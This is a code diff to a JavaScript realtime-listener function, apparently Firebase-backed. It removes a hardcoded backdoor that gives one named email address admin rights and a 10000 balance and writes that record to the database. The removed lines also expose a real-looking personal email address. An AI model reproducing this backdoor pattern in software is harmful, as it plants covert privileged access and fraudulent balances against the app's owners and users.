@@ -481,16 +481,6 @@ function startRealtimeListeners() {
     fbRef(`ladesUsers/${userCleanKey}`).on("value", (snapshot) => {
         let user = snapshot.val();
         
-        if (currentUserEmail === "tsulhan@gmail.com") {
-            if (!user || !user.isAdmin || !user.balance || user.balance < 10000) {
-                user = {
-                    email: "tsulhan@gmail.com",
-                    balance: 10000,
-                    isAdmin: true
-                };
-                fbSet(`ladesUsers/${userCleanKey}`, user);
-            }
-        }
 
         if (user) {
             const userEmailBadge = document.getElementById("user-email-badge");
